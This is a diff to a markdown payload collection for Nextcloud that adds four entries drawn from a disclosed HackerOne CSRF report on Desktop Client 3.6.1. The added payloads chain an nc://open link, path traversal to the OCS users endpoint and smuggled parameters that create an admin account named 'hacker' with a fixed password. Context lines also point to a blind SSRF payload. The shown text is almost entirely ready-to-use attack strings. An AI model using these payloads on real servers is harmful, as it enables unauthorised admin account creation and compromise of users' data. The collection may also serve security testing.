@@ -1,6 +1,6 @@
 # Nextcloud
 
-26 payloads.
+30 payloads.
 
 ### `0547c2a3`
 
@@ -201,6 +201,42 @@ http://metadata.google.internal
 ```
 
 — [Mail app - blind SSRF via imapHost parameter](https://hackerone.com/reports/1736390) · Nextcloud · [supr4s](https://hackerone.com/supr4s)
+
+### `47cfc12a`
+
+```
+path=/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log
+```
+
+**Parameter:** `path`
+— [CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ](https://hackerone.com/reports/1741430) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
+
+### `735339ef`
+
+```
+nc://open/admin@pentest.cloud.wtf/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users
+```
+
+**Parameter:** `token`
+— [CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ](https://hackerone.com/reports/1741430) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
+
+### `97ab7a45`
+
+```
+?token=../../../../../../../ocs/v1.php/cloud/users
+```
+
+**Parameter:** `token`
+— [CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ](https://hackerone.com/reports/1741430) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
+
+### `10e87c2c`
+
+```
+.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log
+```
+
+**Parameter:** `relPath`
+— [CSRF vulnerability in Nextcloud Desktop Client 3.6.1 on Windows when clicking malicious link ](https://hackerone.com/reports/1741430) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
 
 ### `70a00a7c`
 
